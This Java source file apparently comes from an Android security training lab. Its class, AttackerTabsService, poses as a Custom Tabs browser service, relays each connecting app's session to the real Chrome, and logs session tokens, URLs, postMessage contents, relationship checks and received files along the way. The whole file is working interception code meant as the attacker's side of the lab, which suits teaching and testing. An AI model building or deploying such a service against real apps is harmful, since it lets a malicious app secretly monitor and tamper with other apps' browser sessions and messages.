package io.hextree.webviews.customtabs;

import android.content.ComponentName;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.browser.customtabs.CustomTabsCallback;
import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsService;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;
import androidx.browser.customtabs.CustomTabsSessionToken;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

import io.hextree.webviews.Utils;

public class AttackerTabsService extends CustomTabsService {

    String TAG = "AttackerTabsService";
    public final static HashMap<CustomTabsSessionToken, CustomTabsSession> tokenToSessionMap = new HashMap<>();
    public final static HashMap<CustomTabsSessionToken, CustomTabsClient> sessionToClientMap = new HashMap<>();
    public final static HashMap<CustomTabsSession, CustomTabsSessionToken> sessionToTokenMap = new HashMap<>();
    public final static HashMap<CustomTabsSessionToken, AttackerTabsCallback> sessionToCallbackMap = new HashMap<>();


    @Override
    protected boolean warmup(long flags) {
        Log.i(TAG, "warmup("+flags+")");
        return true;
    }

    @Override
    public void onDestroy() {
        tokenToSessionMap.clear();
        super.onDestroy();
    }

    @Override
    protected boolean newSession(CustomTabsSessionToken app_sessionToken) {
        // [1] client connected to our browser server
        Log.i(TAG, "newSession("+app_sessionToken+")");

        CustomTabsServiceConnection mConnection = new CustomTabsServiceConnection() {
            // [3] real chrome connection established
            @Override
            public void onCustomTabsServiceConnected(@NonNull ComponentName name, @NonNull CustomTabsClient chrome_client) {
                // [4] forward callbacks from chrome to the app callback
                AttackerTabsCallback chrome_callback = new AttackerTabsCallback(app_sessionToken.getCallback());

                // [5] create a new chrome session with our callback forwarder
                CustomTabsSession chrome_session = chrome_client.newSession(chrome_callback);

                if (chrome_session != null) {
                    // [6] tokenToSessionMap: associate app_token with remote chrome_ession
                    tokenToSessionMap.put(app_sessionToken, chrome_session);

                    sessionToTokenMap.put(chrome_session, app_sessionToken);
                    sessionToClientMap.put(app_sessionToken, chrome_client);
                    sessionToCallbackMap.put(app_sessionToken, chrome_callback);
                    Log.i(TAG, "Session established");
                    Log.i(TAG, " - CustomTabsSessionToken: "+ app_sessionToken);
                    Log.i(TAG, " - CustomTabsClient: "+ chrome_client);
                    Log.i(TAG, " - CustomTabsSession: "+ chrome_session);
                } else {
                    Log.e(TAG, "Failed to create session for token: " + app_sessionToken);
                }
            }

            @Override
            public void onServiceDisconnected(ComponentName componentName) {
                Log.i(TAG, "Service disconnected for token: " + app_sessionToken);
                tokenToSessionMap.remove(app_sessionToken);
            }
        };

        List<String> packageNames = Arrays.asList(
                "com.google.android.apps.chrome",
                "com.chrome.canary",
                "com.chrome.dev",
                "com.chrome.beta",
                "com.android.chrome"
        );

        // [2] we connect to the real chrome service
        String packageName = CustomTabsClient.getPackageName(this, packageNames, true);
        Log.i(TAG, "Custom Tabs package: "+packageName);
        if(CustomTabsClient.bindCustomTabsService(this, packageName, mConnection)) {
            try {
                while(tokenToSessionMap.get(app_sessionToken) == null) {
                    Log.i(TAG, "Wait for CustomTabsSession from chrome");
                    Thread.sleep(1000);
                }
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        } else {
            Log.i(TAG, "Couldn't connect to CustomTabsService");
        }


        return true;
    }

    @Override
    protected boolean mayLaunchUrl(CustomTabsSessionToken sessionToken, Uri url,
                                   Bundle extras, List<Bundle> otherLikelyBundles) {
        Log.i(TAG, "mayLaunchUrl("+sessionToken.toString()+", "+url.toString()+", "+ Utils.dumpBundle(extras)+")");
        return tokenToSessionMap.get(sessionToken).mayLaunchUrl(url, extras, otherLikelyBundles);
    }

    @Override
    protected Bundle extraCommand(String commandName, Bundle args) {
        Log.i(TAG, "extraCommand("+commandName+", "+ Utils.dumpBundle(args)+")");
        switch(commandName) {
            case "getAccountName": {
                Bundle bundle = new Bundle();
                break;
            }
            default: {

            }
        }
        return null;
    }

    @Override
    protected boolean updateVisuals(CustomTabsSessionToken sessionToken, Bundle bundle) {
        Log.i(TAG, "updateVisuals("+sessionToken.toString()+", "+ Utils.dumpBundle(bundle)+")");
        return true;
    }

    @Override
    protected boolean requestPostMessageChannel(@NonNull CustomTabsSessionToken sessionToken, @NonNull Uri postMessageOrigin) {
        Log.i(TAG, "requestPostMessageChannel("+sessionToken.toString()+", "+ postMessageOrigin.toString()+")");
        return tokenToSessionMap.get(sessionToken).requestPostMessageChannel(postMessageOrigin);
    }

    @Override
    protected int postMessage(@NonNull CustomTabsSessionToken sessionToken, @NonNull String message, @Nullable Bundle extras) {

        Log.i(TAG, "postMessage("+sessionToken.toString()+", "+ message+", "+Utils.dumpBundle(extras)+")");
        return tokenToSessionMap.get(sessionToken).postMessage(message, extras);
    }

    @Override
    protected boolean validateRelationship(CustomTabsSessionToken sessionToken,
                                           @Relation int relation, Uri origin, Bundle extras) {

        Log.i(TAG, "validateRelationship("+sessionToken.toString()+", "+relation+", "+ origin.toString() + ", " + Utils.dumpBundle(extras)+")");
        return tokenToSessionMap.get(sessionToken).validateRelationship(relation, origin, extras);
    }

    @Override
    protected boolean receiveFile(CustomTabsSessionToken sessionToken, Uri uri,
                                  int purpose, Bundle extras) {
        Log.i(TAG, "receiveFile("+sessionToken.toString()+", "+uri.toString()+", "+ Utils.dumpBundle(extras)+")");
        return tokenToSessionMap.get(sessionToken).receiveFile(uri, purpose, extras);
    }
}